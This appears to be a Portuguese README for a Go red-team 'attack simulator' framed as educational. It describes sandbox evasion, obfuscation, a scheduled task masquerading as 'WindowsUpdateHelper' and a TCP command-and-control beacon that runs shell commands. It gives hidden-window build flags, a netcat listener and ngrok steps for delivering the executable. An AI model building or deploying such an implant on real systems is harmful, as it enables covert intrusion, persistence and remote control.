# Silver Bullet Simulator v2.1

> **Framework avançado de simulação de segurança para Red Team e palestras corporativas.**  
> Desenvolvido por [Antonio Camelo](https://antoniocamelo.com) — CEH · CISSP

---

## ⚠️ Aviso Legal

Este projeto é **exclusivamente para fins educacionais** e demonstrações de segurança **autorizadas**.  
A execução em ambientes sem autorização explícita é ilegal e antiética.  
O autor não se responsabiliza pelo uso indevido desta ferramenta.

> *"A melhor defesa começa com o conhecimento do ataque."*

---

## Sobre o Projeto

O **Silver Bullet** é um simulador de ataque escrito em **Go** que demonstra, de forma controlada e didática, como um atacante moderno consegue evadir controles de segurança, estabelecer persistência e operar dentro de uma rede corporativa — mesmo com EDR ativo.

Inspirado em frameworks públicos como [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) e [MITRE ATT&CK Evaluations](https://attackevals.mitre-engenuity.org/), cada módulo mapeia TTPs reais documentadas no MITRE ATT&CK.

### Casos de uso
- Workshops de segurança ofensiva para times de TI
- Demonstrações do argumento *"EDR não é suficiente sozinho"*
- Material didático para treinamentos de Red/Blue Team
- Palestras corporativas sobre postura de segurança

---

## Arquitetura

```
Silver Bullet v2.1
├── CryptoModule       — AES-256-GCM + XOR obfuscation
├── EvasionModule      — Anti-Sandbox / Anti-VM (6 checks)
├── PersistenceModule  — Scheduled Task (XML + CLI fallback)
├── C2Module           — TCP puro + beacon estruturado
├── AlertModule        — Relatório no Desktop (UTF-16 LE)
└── Orquestrador       — 4 fases sequenciais + --limpa
```

---

## 🎯 TTPs MITRE ATT&CK Cobertas

| TTP ID | Nome | Módulo |
|--------|------|--------|
| [T1497](https://attack.mitre.org/techniques/T1497/) | Virtualization/Sandbox Evasion | EvasionModule |
| [T1497.001](https://attack.mitre.org/techniques/T1497/001/) | System Checks | EvasionModule |
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | CryptoModule |
| [T1027.013](https://attack.mitre.org/techniques/T1027/013/) | Encrypted/Encoded File | CryptoModule |
| [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task/Job | PersistenceModule |
| [T1036](https://attack.mitre.org/techniques/T1036/) | Masquerading | PersistenceModule |
| [T1036.004](https://attack.mitre.org/techniques/T1036/004/) | Masquerade Task or Service | PersistenceModule |
| [T1095](https://attack.mitre.org/techniques/T1095/) | Non-Application Layer Protocol | C2Module |
| [T1041](https://attack.mitre.org/techniques/T1041/) | Exfiltration Over C2 Channel | C2Module |
| [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | C2Module |
| [T1033](https://attack.mitre.org/techniques/T1033/) | System Owner/User Discovery | C2Module |
| [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell | C2Module |
| [T1564.003](https://attack.mitre.org/techniques/T1564/003/) | Hide Artifacts: Hidden Window | EvasionModule |
| [T1106](https://attack.mitre.org/techniques/T1106/) | Native API | EvasionModule |

---

## ⚙️ Compilação

### Requisitos
- [Go 1.21+](https://golang.org/dl/)
- `gcc-mingw-w64` (para cross-compile no Linux/Kali)

### No Kali Linux

```bash
# Instalar dependências
sudo apt install -y golang gcc-mingw-w64

# Clonar repositório
git clone https://github.com/antoniocamello/silver-bullet-simulator
cd silver-bullet-simulator

# Inicializar módulo e instalar dependências Go
go mod init silverbullet
go get golang.org/x/sys/windows

# Compilar para Windows 64-bit (sem janela de terminal)
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 \
  CC=x86_64-w64-mingw32-gcc \
  go build -ldflags="-s -w -H=windowsgui" \
  -o SilverBullet.exe .
```

### Configuração do C2

Antes de compilar, edite as configurações no arquivo `Silverbullet.go`:

```go
var config = Config{
    C2Address:        "SEU_IP:9443",  // IP do servidor C2
    C2BeaconInterval: 30 * time.Second,
    C2JitterPercent:  30,
    TaskName:         "WindowsUpdateHelper",
    ...
}
```

---

## Uso

### Servidor C2 (Kali Linux)

```bash
# Receptor TCP compatível com o simulador
nc -lvnp 9443
```

### Execução no Windows

```bash
# Execução normal — inicia todas as 4 fases
SilverBullet.exe

# Limpeza — remove todos os artefatos após a demonstração
SilverBullet.exe --limpa
```

### Fluxo de execução

```
Fase 0 — Anti-Sandbox    Verifica se o ambiente é real (6 checks)
Fase 1 — Alerta          Cria ALERTA_RED_TEAM.txt no Desktop
Fase 2 — Persistência    Cria tarefa agendada "WindowsUpdateHelper"
Fase 3 — C2              Conecta ao servidor e aguarda comandos
```

### Download para demonstração (ngrok)

```bash
# No Kali — serve o .exe para download na máquina Windows podem ser utilizados o Python ou o Ngrok:
python3 -m http.server 8080
ngrok http 8080

## 📋 Requisitos do Ambiente de Demonstração

- Sistema Operacional: **Windows 10/11 64-bit**
- Servidor C2: **Linux com netcat** (`nc -lvnp 9443`)
- Conectividade de rede entre os dois ambientes
- Autorização prévia e documentada para execução

<div align="center">

**⚠️ USE COM RESPONSABILIDADE — APENAS EM AMBIENTES AUTORIZADOS ⚠️**

</div>
